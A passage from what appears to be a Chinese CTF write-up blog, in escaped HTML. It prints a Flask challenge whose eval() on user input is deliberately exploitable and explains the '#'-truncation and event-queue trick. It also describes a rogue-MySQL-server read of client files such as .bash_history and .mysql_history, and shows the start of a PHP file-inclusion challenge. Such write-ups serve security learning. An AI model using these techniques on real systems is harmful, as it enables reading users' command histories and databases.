            args = get_mid_str(event, action + &lt;span&gt;'&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;).split(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;) &lt;span&gt;#&lt;/span&gt;&lt;span&gt;True#True&lt;/span&gt;
            &lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
                event_handler &lt;/span&gt;= eval(action + (&lt;span&gt;'&lt;/span&gt;&lt;span&gt;_handler&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; is_action &lt;span&gt;else&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;_function&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;))
                ret_val &lt;/span&gt;=&lt;span&gt; event_handler(args)
            &lt;/span&gt;&lt;span&gt;except&lt;/span&gt;&lt;span&gt; RollBackException:
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; resp &lt;span&gt;is&lt;/span&gt; None: resp = &lt;span&gt;''&lt;/span&gt;&lt;span&gt;
                resp &lt;/span&gt;+= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;ERROR! All transactions have been cancelled. &amp;lt;br /&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;
                resp &lt;/span&gt;+= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;lt;a href=&quot;./?action:view;index&quot;&amp;gt;Go back to index.html&amp;lt;/a&amp;gt;&amp;lt;br /&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;
                session[&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;num_items&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;] = request.prev_session[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;num_items&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]
                session[&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;points&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;] = request.prev_session[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;points&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]
                &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;
            &lt;span&gt;except&lt;/span&gt;&lt;span&gt; Exception, e:
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; resp &lt;span&gt;is&lt;/span&gt; None: resp = &lt;span&gt;''&lt;/span&gt;
                &lt;span&gt;#&lt;/span&gt;&lt;span&gt; resp += str(e) # only for debugging&lt;/span&gt;
                &lt;span&gt;continue&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt; ret_val &lt;span&gt;is&lt;/span&gt; &lt;span&gt;not&lt;/span&gt;&lt;span&gt; None:
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; resp &lt;span&gt;is&lt;/span&gt;&lt;span&gt; None:
                    resp &lt;/span&gt;=&lt;span&gt; ret_val
                &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
                    resp &lt;/span&gt;+=&lt;span&gt; ret_val
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; resp &lt;span&gt;is&lt;/span&gt; None &lt;span&gt;or&lt;/span&gt; resp == &lt;span&gt;''&lt;/span&gt;: resp = (&lt;span&gt;'&lt;/span&gt;&lt;span&gt;404 NOT FOUND&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, 404&lt;span&gt;)
    session.modified &lt;/span&gt;=&lt;span&gt; True
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; resp


@app.route(url_prefix &lt;/span&gt;+ &lt;span&gt;'&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; entry_point():
    querystring &lt;/span&gt;=&lt;span&gt; urllib.unquote(request.query_string)
    request.event_queue &lt;/span&gt;=&lt;span&gt; []
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; querystring == &lt;span&gt;''&lt;/span&gt; &lt;span&gt;or&lt;/span&gt; (&lt;span&gt;not&lt;/span&gt; querystring.startswith(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;action:&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;)) &lt;span&gt;or&lt;/span&gt; len(querystring) &amp;gt; 100&lt;span&gt;:
        querystring &lt;/span&gt;= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;action:index;False#False&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;num_items&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; &lt;span&gt;not&lt;/span&gt; &lt;span&gt;in&lt;/span&gt;&lt;span&gt; session:
        session[&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;num_items&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;] =&lt;span&gt; 0
        session[&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;points&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;] = 3&lt;span&gt;
        session[&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;log&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;] =&lt;span&gt; []
    request.prev_session &lt;/span&gt;=&lt;span&gt; dict(session)
    trigger_event(querystring)
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; execute_event_loop()


&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; handlers/functions below --------------------------------------&lt;/span&gt;

&lt;span&gt;def&lt;/span&gt;&lt;span&gt; view_handler(args):
    page &lt;/span&gt;=&lt;span&gt; args[0]
    html &lt;/span&gt;= &lt;span&gt;''&lt;/span&gt;&lt;span&gt;
    html &lt;/span&gt;+= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;[INFO] you have {} diamonds, {} points now.&amp;lt;br /&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;.format(session[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;num_items&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;], session[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;points&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;])
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; page == &lt;span&gt;'&lt;/span&gt;&lt;span&gt;index&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:
        html &lt;/span&gt;+= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;lt;a href=&quot;./?action:index;True%23False&quot;&amp;gt;View source code&amp;lt;/a&amp;gt;&amp;lt;br /&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;
        html &lt;/span&gt;+= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;lt;a href=&quot;./?action:view;shop&quot;&amp;gt;Go to e-shop&amp;lt;/a&amp;gt;&amp;lt;br /&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;
        html &lt;/span&gt;+= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;lt;a href=&quot;./?action:view;reset&quot;&amp;gt;Reset&amp;lt;/a&amp;gt;&amp;lt;br /&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
    &lt;span&gt;elif&lt;/span&gt; page == &lt;span&gt;'&lt;/span&gt;&lt;span&gt;shop&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:
        html &lt;/span&gt;+= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;lt;a href=&quot;./?action:buy;1&quot;&amp;gt;Buy a diamond (1 point)&amp;lt;/a&amp;gt;&amp;lt;br /&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
    &lt;span&gt;elif&lt;/span&gt; page == &lt;span&gt;'&lt;/span&gt;&lt;span&gt;reset&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:
        &lt;/span&gt;&lt;span&gt;del&lt;/span&gt; session[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;num_items&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]
        html &lt;/span&gt;+= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Session reset.&amp;lt;br /&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;
    html &lt;/span&gt;+= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;lt;a href=&quot;./?action:view;index&quot;&amp;gt;Go back to index.html&amp;lt;/a&amp;gt;&amp;lt;br /&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
    &lt;span&gt;return&lt;/span&gt;&lt;span&gt; html


&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; index_handler(args):
    bool_show_source &lt;/span&gt;=&lt;span&gt; str(args[0])
    bool_download_source &lt;/span&gt;= str(args[1&lt;span&gt;])
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; bool_show_source == &lt;span&gt;'&lt;/span&gt;&lt;span&gt;True&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:

        source &lt;/span&gt;= open(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;eventLoop.py&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;r&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
        html &lt;/span&gt;= &lt;span&gt;''&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; bool_download_source != &lt;span&gt;'&lt;/span&gt;&lt;span&gt;True&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:
            html &lt;/span&gt;+= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;lt;a href=&quot;./?action:index;True%23True&quot;&amp;gt;Download this .py file&amp;lt;/a&amp;gt;&amp;lt;br /&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;
            html &lt;/span&gt;+= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;lt;a href=&quot;./?action:view;index&quot;&amp;gt;Go back to index.html&amp;lt;/a&amp;gt;&amp;lt;br /&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;

        &lt;span&gt;for&lt;/span&gt; line &lt;span&gt;in&lt;/span&gt;&lt;span&gt; source:
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; bool_download_source != &lt;span&gt;'&lt;/span&gt;&lt;span&gt;True&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:
                html &lt;/span&gt;+= line.replace(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;amp;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;amp;amp;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;).replace(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;\t&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;amp;nbsp;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; * 4).replace(&lt;span&gt;'&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;amp;nbsp;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;).replace(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,
                                                                                                              &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;amp;lt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;).replace(
                    &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;).replace(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;\n&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;lt;br /&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
                html &lt;/span&gt;+=&lt;span&gt; line
        source.close()

        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; bool_download_source == &lt;span&gt;'&lt;/span&gt;&lt;span&gt;True&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:
            headers &lt;/span&gt;=&lt;span&gt; {}
            headers[&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Content-Type&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;] = &lt;span&gt;'&lt;/span&gt;&lt;span&gt;text/plain&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;
            headers[&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Content-Disposition&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;] = &lt;span&gt;'&lt;/span&gt;&lt;span&gt;attachment; filename=serve.py&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
            &lt;span&gt;return&lt;/span&gt; Response(html, headers=&lt;span&gt;headers)
        &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; html
    &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
        trigger_event(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;action:view;index&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)


&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; buy_handler(args):
    num_items &lt;/span&gt;=&lt;span&gt; int(args[0])
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; num_items &amp;lt;= 0: &lt;span&gt;return&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;invalid number({}) of diamonds to buy&amp;lt;br /&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(args[0])
    session[&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;num_items&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;] +=&lt;span&gt; num_items
    trigger_event([&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;func:consume_point;{}&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;.format(num_items), &lt;span&gt;'&lt;/span&gt;&lt;span&gt;action:view;index&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;])


&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; consume_point_function(args):
    point_to_consume &lt;/span&gt;=&lt;span&gt; int(args[0])
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; session[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;points&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;] &amp;lt; point_to_consume: &lt;span&gt;raise&lt;/span&gt;&lt;span&gt; RollBackException()
    session[&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;points&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;] -=&lt;span&gt; point_to_consume


&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; show_flag_function(args):
    flag &lt;/span&gt;=&lt;span&gt; args[0]
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.&lt;/span&gt;
    &lt;span&gt;return&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;You naughty boy! ;) &amp;lt;br /&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;


&lt;span&gt;def&lt;/span&gt;&lt;span&gt; get_flag_handler(args):
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; session[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;num_items&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;] &amp;gt;= 5&lt;span&gt;:
        trigger_event(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;func:show_flag;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; + FLAG())  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; show_flag_function has been disabled, no worries&lt;/span&gt;
    trigger_event(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;action:view;index&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)


&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; &lt;span&gt;__name__&lt;/span&gt; == &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__main__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:
    app.run(debug&lt;/span&gt;=False, host=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;0.0.0.0&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这道题目首先通读源码是必须的，另一个必须要了解到的出题点在eval()函数这个地方，eval中可以传入#来注释掉后面的部分&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201904/1063309-20190428135644629-1610188505.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;从上图可以看出来，此时eval会忽略掉#后面的所有字符串，以及要做出这道题的另一个点：&lt;/p&gt;
&lt;p&gt;打破程序进行的流程，先加钻石数量再检验钱数，并且可以给事件传入一个列表，那么先加钻石，在检验钱之前去getflag即可，而且这里会把flag带到log中去，总之就是在一个正常的处理序列中去插入一个新的事件，因为eval这里可控，所以刚开始就应该反映到出题点&lt;/p&gt;
&lt;p&gt;在这里！&lt;/p&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;50&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt;!/usr/bin/env python&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt; -*- coding: utf-8 -*-&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt; @Time    : 12/1/2019 2:58 PM&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt; @Author  : fz&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt; @Site    : &lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt; @File    : agent.py&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt; @Software: PyCharm&lt;/span&gt;

&lt;span&gt;import&lt;/span&gt;&lt;span&gt; json
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; BaseHTTPServer &lt;span&gt;import&lt;/span&gt;&lt;span&gt; HTTPServer, BaseHTTPRequestHandler
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; optparse &lt;span&gt;import&lt;/span&gt;&lt;span&gt; OptionParser
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; subprocess &lt;span&gt;import&lt;/span&gt;&lt;span&gt; Popen, PIPE


&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; RequestHandler(BaseHTTPRequestHandler):

    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; do_GET(self):
        request_path &lt;/span&gt;=&lt;span&gt; self.path

        &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\n----- Request Start -----&amp;gt;\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
        &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;request_path :&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, request_path)
        &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;self.headers :&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, self.headers)
        &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&amp;lt;----- Request End -----\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)

        self.send_response(&lt;/span&gt;200&lt;span&gt;)
        self.send_header(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Set-Cookie&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;foo=bar&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
        self.end_headers()

        result &lt;/span&gt;=&lt;span&gt; self._func()
        self.wfile.write(json.dumps(result))


    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; do_POST(self):
        request_path &lt;/span&gt;=&lt;span&gt; self.path

        &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; print(&quot;\n----- Request Start -----&amp;gt;\n&quot;)&lt;/span&gt;
        &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;request_path : %s&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, request_path)

        request_headers &lt;/span&gt;=&lt;span&gt; self.headers
        content_length &lt;/span&gt;= request_headers.getheaders(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;content-length&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
        length &lt;/span&gt;= int(content_length[0]) &lt;span&gt;if&lt;/span&gt; content_length &lt;span&gt;else&lt;/span&gt;&lt;span&gt; 0

        &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; print(&quot;length :&quot;, length)&lt;/span&gt;

        &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;request_headers : %s&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; %&lt;span&gt; request_headers)
        &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;content : %s&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; %&lt;span&gt; self.rfile.read(length))
        &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; print(&quot;&amp;lt;----- Request End -----\n&quot;)&lt;/span&gt;
&lt;span&gt;
        self.send_response(&lt;/span&gt;200&lt;span&gt;)
        self.send_header(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Set-Cookie&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;foo=bar&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
        self.end_headers()
        result &lt;/span&gt;=&lt;span&gt; self._func()
        self.wfile.write(json.dumps(result))

    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; _func(self):
        netstat &lt;/span&gt;= Popen([&lt;span&gt;'&lt;/span&gt;&lt;span&gt;netstat&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;-tlnp&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;], stdout=&lt;span&gt;PIPE)
        netstat.wait()

        ps_list &lt;/span&gt;=&lt;span&gt; netstat.stdout.readlines()
        result &lt;/span&gt;=&lt;span&gt; []
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; item &lt;span&gt;in&lt;/span&gt; ps_list[2&lt;span&gt;:]:
            tmp &lt;/span&gt;=&lt;span&gt; item.split()
            Local_Address &lt;/span&gt;= tmp[3&lt;span&gt;]
            Process_name &lt;/span&gt;= tmp[6&lt;span&gt;]
            tmp_dic &lt;/span&gt;= {&lt;span&gt;'&lt;/span&gt;&lt;span&gt;local_address&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: Local_Address, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Process_name&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;: Process_name}
            result.append(tmp_dic)
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; result

    do_PUT &lt;/span&gt;=&lt;span&gt; do_POST
    do_DELETE &lt;/span&gt;=&lt;span&gt; do_GET


&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; main():
    port &lt;/span&gt;= 8123
    &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Listening on localhost:%s&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; %&lt;span&gt; port)
    server &lt;/span&gt;= HTTPServer((&lt;span&gt;'&lt;/span&gt;&lt;span&gt;0.0.0.0&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, port), RequestHandler)
    server.serve_forever()


&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; &lt;span&gt;__name__&lt;/span&gt; == &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;__main__&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;:
    parser &lt;/span&gt;=&lt;span&gt; OptionParser()
    parser.usage &lt;/span&gt;=&lt;span&gt; (
        &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Creates an http-server that will echo out any GET or POST parameters, and respond with dummy data\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
        &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Run:\n\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
    (options, args) &lt;/span&gt;=&lt;span&gt; parser.parse_args()

    main()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 这道题主要是来攻击mysql连接的客户端，这个题目给了agent.py 是用来检测是不是服务器上存在mysqld进程，而判断是通过do_get和do_post两个函数确定的，这两个函数都会调用_func函数，返回进程名，然后do_get 和do_post再把_func的返回值输出，&lt;/p&gt;
&lt;p&gt;所以只需要让最后输出的存在mysqld就行了，然后就可以在服务器上读取客户端的文件。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201904/1063309-20190428194010309-699157833.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201904/1063309-20190428194145794-50956790.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这里读取客户端的.mysql_histoty文件，这个文件存储了用户登陆mysql服务器所执行的命令，也可以读取.bash_history&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201904/1063309-20190428195431768-1859874959.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在这里又可以读到web的源码地址，所以可以继续读取它：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201904/1063309-20190428195741944-1823029182.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在这里能够发现flag所在的库和表，所以就可以读取表中的内容，又因为linux下，mysql安装后，数据库的数据默认存放在/var/lib/mysql目录下，所以可以直接访问其中的库表，所以可以直接读取&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
/var/lib/mysql/security/flag.ibd
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;这道题比较常规&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&amp;lt;html&amp;gt;
&amp;lt;?&lt;span&gt;php
&lt;/span&gt;&lt;span&gt;error_reporting&lt;/span&gt;(0&lt;span&gt;); 
&lt;/span&gt;&lt;span&gt;$file&lt;/span&gt; = &lt;span&gt;$_GET&lt;/span&gt;[&quot;file&quot;&lt;span&gt;]; 
&lt;/span&gt;&lt;span&gt;$payload&lt;/span&gt; = &lt;span&gt;$_GET&lt;/span&gt;[&quot;payload&quot;&lt;span&gt;];
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(!&lt;span&gt;isset&lt;/span&gt;(&lt;span&gt;$file&lt;/span&gt;&lt;span&gt;)){
    &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; 'Missing parameter'.'&amp;lt;br&amp;gt;'&lt;span&gt;;
}
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;preg_match&lt;/span&gt;(&quot;/flag/&quot;,&lt;span&gt;$file&lt;/span&gt;&lt;span&gt;)){
    &lt;/span&gt;&lt;span&gt;die&lt;/span&gt;('hack attacked!!!'&lt;span&gt;);
}
